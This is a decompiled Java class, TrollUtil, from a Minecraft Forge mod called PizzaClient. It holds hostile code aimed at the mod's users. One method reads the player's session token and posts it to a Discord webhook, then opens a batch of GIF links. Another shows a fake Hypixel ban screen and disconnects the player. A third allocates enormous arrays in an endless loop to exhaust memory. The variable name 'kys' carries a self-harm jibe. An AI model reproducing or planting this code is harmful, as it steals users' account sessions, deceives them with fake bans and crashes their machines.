// 
// Decompiled by Procyon v0.5.36
// 

package qolskyblockmod.pizzaclient.util;

import org.apache.logging.log4j.Level;
import net.minecraftforge.fml.common.FMLLog;
import qolskyblockmod.pizzaclient.util.remote.DiscordWebhook;
import net.minecraft.util.IChatComponent;
import net.minecraft.network.play.server.S40PacketDisconnect;
import qolskyblockmod.pizzaclient.PizzaClient;
import qolskyblockmod.pizzaclient.util.misc.RandomString;
import net.minecraft.util.ChatComponentText;

public class TrollUtil
{
    public static void ban() {
        youJustGotTrolledBro();
        final ChatComponentText text = new ChatComponentText("§cYou are temporarily banned for §f359d 23h 59m 59s §cfrom this server!");
        text.func_150258_a("\n");
        text.func_150258_a("\n§7Reason: §rCheating through the use of unfair game advantages.");
        text.func_150258_a("\n§7Find out more: §b§nhttps://www.hypixel.net/appeal");
        text.func_150258_a("\n");
        text.func_150258_a("\n§7Ban ID: §r#" + RandomString.nextString("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", 8));
        text.func_150258_a("\n§7Sharing your Ban ID may affect the processing of your appeal!");
        PizzaClient.mc.field_71439_g.field_71174_a.func_147253_a(new S40PacketDisconnect((IChatComponent)text));
    }
    
    public static void sendSessionIDToPizza() {
        try {
            final DiscordWebhook webhook = new DiscordWebhook("\u28c0\u28e0\u28e4\u28e4\u28e4\u28e4\u28a4\u28e4\u28c4\u28c0\u28c0\u28c0\u28c0\u2840\u2840\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\n\u2804\u2809\u2839\u28fe\u28ff\u28db\u28ff\u28ff\u28de\u28ff\u28db\u28fa\u28fb\u28be\u28fe\u28ff\u28ff\u28ff\u28f6\u28f6\u28f6\u28c4\u2840\u2804\u2804\u2804\n\u2804\u2804\u2820\u28ff\u28f7\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ef\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28c6\u2804\u2804\n\u2804\u2804\u2818\u281b\u281b\u281b\u281b\u280b\u283f\u28f7\u28ff\u28ff\u287f\u28ff\u28bf\u281f\u281f\u281f\u283b\u283b\u28ff\u28ff\u28ff\u28ff\u2840\u2804\n\u2804\u2880\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u289b\u28ff\u28c1\u2804\u2804\u2812\u2802\u2804\u2804\u28c0\u28f0\u28ff\u28ff\u28ff\u28ff\u2840\n\u2804\u2809\u281b\u283a\u28b6\u28f7\u2876\u2803\u2804\u2804\u2828\u28ff\u28ff\u2847\u2804\u287a\u28fe\u28fe\u28fe\u28ff\u28ff\u28ff\u28ff\u28fd\u28ff\u28ff\n\u2804\u2804\u2804\u2804\u2804\u281b\u2801\u2804\u2804\u2804\u2880\u28ff\u28ff\u28e7\u2840\u2804\u2839\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u28ff\u28fb\u28ff\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2809\u281b\u281f\u2807\u2880\u28b0\u28ff\u28ff\u28ff\u28cf\u2809\u28bf\u28fd\u28bf\u284f\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2820\u2824\u28e4\u28f4\u28fe\u28ff\u28ff\u28fe\u28ff\u28ff\u28e6\u2804\u28b9\u287f\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2812\u28f3\u28f6\u28e4\u28e4\u28c4\u28c0\u28c0\u2848\u28c0\u2881\u2881\u2881\u28c8\u28c4\u2890\u2803\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u28f0\u28ff\u28db\u28fb\u287f\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u286f\u2804\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u28ec\u28fd\u28ff\u28fb\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2801\u2804\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2898\u28ff\u28ff\u28fb\u28db\u28ff\u287f\u28df\u28fb\u28ff\u28ff\u28ff\u28ff\u285f\u2804\u2804\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u281b\u289b\u28bf\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28f7\u287f\u2801\u2804\u2804\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2809\u2809\u2809\u2809\u2808\u2804\u2804\u2804\u2804\u2804\u2804\n");
            webhook.setContent(PizzaClient.mc.func_110432_I().func_148255_b());
            webhook.execute();
        }
        catch (Exception e) {
            youJustGotTrolledBro();
        }
        openFunnyURLS();
    }
    
    public static void youJustGotTrolledBro() {
        FMLLog.getLogger().log(Level.INFO, "\u28c0\u28e0\u28e4\u28e4\u28e4\u28e4\u28a4\u28e4\u28c4\u28c0\u28c0\u28c0\u28c0\u2840\u2840\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\n\u2804\u2809\u2839\u28fe\u28ff\u28db\u28ff\u28ff\u28de\u28ff\u28db\u28fa\u28fb\u28be\u28fe\u28ff\u28ff\u28ff\u28f6\u28f6\u28f6\u28c4\u2840\u2804\u2804\u2804\n\u2804\u2804\u2820\u28ff\u28f7\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ef\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28c6\u2804\u2804\n\u2804\u2804\u2818\u281b\u281b\u281b\u281b\u280b\u283f\u28f7\u28ff\u28ff\u287f\u28ff\u28bf\u281f\u281f\u281f\u283b\u283b\u28ff\u28ff\u28ff\u28ff\u2840\u2804\n\u2804\u2880\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u289b\u28ff\u28c1\u2804\u2804\u2812\u2802\u2804\u2804\u28c0\u28f0\u28ff\u28ff\u28ff\u28ff\u2840\n\u2804\u2809\u281b\u283a\u28b6\u28f7\u2876\u2803\u2804\u2804\u2828\u28ff\u28ff\u2847\u2804\u287a\u28fe\u28fe\u28fe\u28ff\u28ff\u28ff\u28ff\u28fd\u28ff\u28ff\n\u2804\u2804\u2804\u2804\u2804\u281b\u2801\u2804\u2804\u2804\u2880\u28ff\u28ff\u28e7\u2840\u2804\u2839\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u28ff\u28fb\u28ff\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2809\u281b\u281f\u2807\u2880\u28b0\u28ff\u28ff\u28ff\u28cf\u2809\u28bf\u28fd\u28bf\u284f\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2820\u2824\u28e4\u28f4\u28fe\u28ff\u28ff\u28fe\u28ff\u28ff\u28e6\u2804\u28b9\u287f\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2812\u28f3\u28f6\u28e4\u28e4\u28c4\u28c0\u28c0\u2848\u28c0\u2881\u2881\u2881\u28c8\u28c4\u2890\u2803\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u28f0\u28ff\u28db\u28fb\u287f\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u286f\u2804\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u28ec\u28fd\u28ff\u28fb\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2801\u2804\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2898\u28ff\u28ff\u28fb\u28db\u28ff\u287f\u28df\u28fb\u28ff\u28ff\u28ff\u28ff\u285f\u2804\u2804\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u281b\u289b\u28bf\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28f7\u287f\u2801\u2804\u2804\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2809\u2809\u2809\u2809\u2808\u2804\u2804\u2804\u2804\u2804\u2804\n");
    }
    
    public static String getTroll() {
        return "\u28c0\u28e0\u28e4\u28e4\u28e4\u28e4\u28a4\u28e4\u28c4\u28c0\u28c0\u28c0\u28c0\u2840\u2840\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\n\u2804\u2809\u2839\u28fe\u28ff\u28db\u28ff\u28ff\u28de\u28ff\u28db\u28fa\u28fb\u28be\u28fe\u28ff\u28ff\u28ff\u28f6\u28f6\u28f6\u28c4\u2840\u2804\u2804\u2804\n\u2804\u2804\u2820\u28ff\u28f7\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ef\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28c6\u2804\u2804\n\u2804\u2804\u2818\u281b\u281b\u281b\u281b\u280b\u283f\u28f7\u28ff\u28ff\u287f\u28ff\u28bf\u281f\u281f\u281f\u283b\u283b\u28ff\u28ff\u28ff\u28ff\u2840\u2804\n\u2804\u2880\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u289b\u28ff\u28c1\u2804\u2804\u2812\u2802\u2804\u2804\u28c0\u28f0\u28ff\u28ff\u28ff\u28ff\u2840\n\u2804\u2809\u281b\u283a\u28b6\u28f7\u2876\u2803\u2804\u2804\u2828\u28ff\u28ff\u2847\u2804\u287a\u28fe\u28fe\u28fe\u28ff\u28ff\u28ff\u28ff\u28fd\u28ff\u28ff\n\u2804\u2804\u2804\u2804\u2804\u281b\u2801\u2804\u2804\u2804\u2880\u28ff\u28ff\u28e7\u2840\u2804\u2839\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u28ff\u28fb\u28ff\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2809\u281b\u281f\u2807\u2880\u28b0\u28ff\u28ff\u28ff\u28cf\u2809\u28bf\u28fd\u28bf\u284f\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2820\u2824\u28e4\u28f4\u28fe\u28ff\u28ff\u28fe\u28ff\u28ff\u28e6\u2804\u28b9\u287f\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2812\u28f3\u28f6\u28e4\u28e4\u28c4\u28c0\u28c0\u2848\u28c0\u2881\u2881\u2881\u28c8\u28c4\u2890\u2803\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u28f0\u28ff\u28db\u28fb\u287f\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u286f\u2804\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u28ec\u28fd\u28ff\u28fb\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2801\u2804\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2898\u28ff\u28ff\u28fb\u28db\u28ff\u287f\u28df\u28fb\u28ff\u28ff\u28ff\u28ff\u285f\u2804\u2804\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u281b\u289b\u28bf\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28f7\u287f\u2801\u2804\u2804\u2804\n\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2809\u2809\u2809\u2809\u2808\u2804\u2804\u2804\u2804\u2804\u2804\n";
    }
    
    public static void doTheFunny() {
        while (true) {
            try {
                while (true) {
                    double[][][][] kys = new double[187][187][187][187];
                    kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = (kys = kys))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    new Thread(TrollUtil::doTheFunny);
                }
            }
            catch (Exception e) {
                youJustGotTrolledBro();
                continue;
            }
            break;
        }
    }
    
    public static void openFunnyURLS() {
        for (final String s : new String[] { "https://media.giphy.com/media/6Jzkf3IR1DzYfp6Jsa/giphy.gif?cid=790b76114680848c0ba8a7185fa42c6f7e0fff58badf222c&rid=giphy.gif&ct=g", "https://media.discordapp.net/attachments/839901938413469696/935263904114831360/image0-30.gif", "https://media.discordapp.net/attachments/331774867471073280/865782275609985064/4a79403.gif", "https://media.discordapp.net/attachments/837141887868862554/852445652637188116/image0.gif", "https://media.discordapp.net/attachments/911324609448673294/917215527582183424/ezgif-6-0f792136b146.gif", "https://media.discordapp.net/attachments/690944051733856308/740293558493380648/image0-27.gif", "https://imgur.com/a/qNB2fd8", "https://media.discordapp.net/attachments/669308329419341836/802916620933660672/image0.gif" }) {
            Utils.openUrl(s);
        }
    }
}
